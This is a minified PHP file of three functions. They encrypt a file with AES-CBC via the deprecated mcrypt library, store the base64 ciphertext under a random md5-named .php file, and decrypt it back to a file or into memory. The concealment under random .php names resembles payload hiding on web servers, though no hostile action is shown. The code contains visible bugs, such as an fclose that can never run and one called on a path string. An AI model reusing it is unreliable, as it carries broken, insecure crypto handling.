<?php if(function_exists('crypt_my_file')){}else{function crypt_my_file($a,$b,$c,$d){if(!isset($a)||!isset($b)||!isset($c)||!isset($d)){}else{$a1 = $a."/".$b;$a2 = filesize($a1);$a3 = fopen($a1, "r");$a4 = fread($a3,$a2);fclose($a3);$b1 = pack('H*', $c."".$d);$b2 = pack('H*', $c."".$d);$b3 =  strlen($b1);$b4 = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);$iv = mcrypt_create_iv($b4, MCRYPT_RAND);$b6 = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $b1, $a4, MCRYPT_MODE_CBC, $iv);$b6 = $iv . $b6;$b7 = base64_encode($b6);$vf1 = md5(rand(0,99999999998));$vf2 = md5(rand(99999999999,9999999999999999999999));$b8 = md5(md5($vf1)."".(md5($vf2))."".(md5($c))."".(md5($d)));$a12 = $a."/".$b8.".php";$b9 = fopen($a12, "w+");$b10 = fwrite($b9, $b7);if($b10){return $b8."|".$b4;}fclose($b9);}}} if(function_exists('decrypt_my_file')){}else{function decrypt_my_file($a,$b,$c,$d,$e,$f,$g){if(!isset($a)||!isset($b)||!isset($c)||!isset($d)||!isset($e)||!isset($f)||!isset($g)){}else{$b1 = pack('H*', $e."".$f);$b2 = pack('H*', $e."".$f);$b3 =  strlen($b1);$e1 = $a."/".$b;$a23 = filesize($e1);$a33 = fopen($e1, "r");$a43 = fread($a33,$a23);fclose($a33);$e2 = base64_decode($a43);$e3 = substr($e2, 0, $g);$e2 = substr($e2, $g);$e4 = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $b2, $e2, MCRYPT_MODE_CBC, $e3);$dp3 = fopen($c.".".$d, "w+");$g1 = fwrite($dp3, $e4);if($g1){return "1";}else{}fclose($dp3);}}} if(function_exists('decrypt_my_file2')){}else{function decrypt_my_file2($a,$b,$c,$d,$e,$f,$g){if(!isset($a)||!isset($b)||!isset($c)||!isset($d)||!isset($e)||!isset($f)||!isset($g)){}else{$b1 = pack('H*', $e."".$f);$b2 = pack('H*', $e."".$f);$b3 =  strlen($b1);$e1 = $a."/".$b;$a23 = filesize($e1);$a33 = fopen($e1, "r");$a43 = fread($a33,$a23);fclose($a33);$e2 = base64_decode($a43);$e3 = substr($e2, 0, $g);$e2 = substr($e2, $g);$e4 = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $b2, $e2, MCRYPT_MODE_CBC, $e3); return $e4; fclose($e1);}}}?>